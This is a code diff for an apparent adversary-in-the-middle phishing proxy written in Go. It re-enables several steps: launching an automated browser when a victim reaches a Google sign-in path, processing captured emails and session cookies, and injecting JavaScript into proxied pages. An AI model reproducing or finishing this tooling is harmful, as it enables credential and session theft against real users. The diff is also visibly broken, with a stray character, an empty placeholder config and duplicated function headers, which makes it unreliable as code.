@@ -1085,7 +1085,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnResponse().DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 
-		// Removed the block that calls launchBrowser
+		if resp.Request.URL.Path == "/v3/signin/identifier" {
+			// Ensure cfg is available in this scope
+			cfg := &Config{
+				// Initialize cfg with necessary values
+			}
+			browserContext, page, err = launchBrowser(cfg)
+			if err != nil {
+				log.Info(Red+"❌ Error in starting browser and navigating: %v"+Reset, err)
+			}
+		}
 
 		var lastProcessedEmail string
 		//var lastProcessedPassword string
@@ -1102,13 +1111,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return resp
 				}
 
-		if _, ok := queryParams["running"]; ok && len(queryParams["running"]) > 0 && queryParams["running"][0] == "true" {
+				if running, ok := queryParams["running"]; ok && len(running) > 0 && running[0] == "true" {
 					return resp
 				}
 
 				// Call processEmailAndCookies with the necessary arguments
+				resp = processEmailAndCookies(browserContext, page, email, queryParams, resp)
 				lastProcessedEmail = email
-                return resp
+				return resp
 			}
 		}
 
@@ -1493,13 +1503,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 						js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
-						if err != nil {
-							log.Error("Error reading response body: %v", err)
-							return resp
+						if err == nil {
+							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
 						}
 
 						log.Debug("js_inject: injected redirect script for session: %s", s.Id)
-                        // Removed the call to injectJavascriptIntoBody
+						body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+					}
 				}
 			}
 
@@ -1567,7 +1577,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 
 		return resp
-	}
+	})
 
 	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
 	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
@@ -1576,10 +1586,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	return p, nil
 }
-}
-	
 
-func checkCookiesAndRedirect(resp *http.Response) *http.Response {
+var once sync.Once
+
 func checkCookiesAndRedirect(resp *http.Response) *http.Response {
 	// Check for cookies and redirect if found
 	cookies := resp.Request.Cookies()
@@ -1614,7 +1623,7 @@ func checkCookiesAndRedirect(resp *http.Response) *http.Response {
 				http.Redirect(w, r, homePage, http.StatusFound)
 			}(w, resp.Request)
 		})
-	} else { 
+	} else {
 		log.Info("Not all required cookies found. Found cookies: %v", foundCookies)
 	}
 
@@ -1622,7 +1631,7 @@ func checkCookiesAndRedirect(resp *http.Response) *http.Response {
 }
 
 // handleRedirect checks the global redirectURL and performs a redirect if it has a value.
-func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
+
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 
 	s, ok := p.sessions[session_id]
@@ -1996,8 +2005,8 @@ func cleanText(text string) string {
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
 		parts := strings.SplitN(host, ":", 2)
-port := 443
-A		port := 443
+		hostname := parts[0]
+		port := 443
 		if len(parts) == 2 {
 			port, _ = strconv.Atoi(parts[1])
 		}
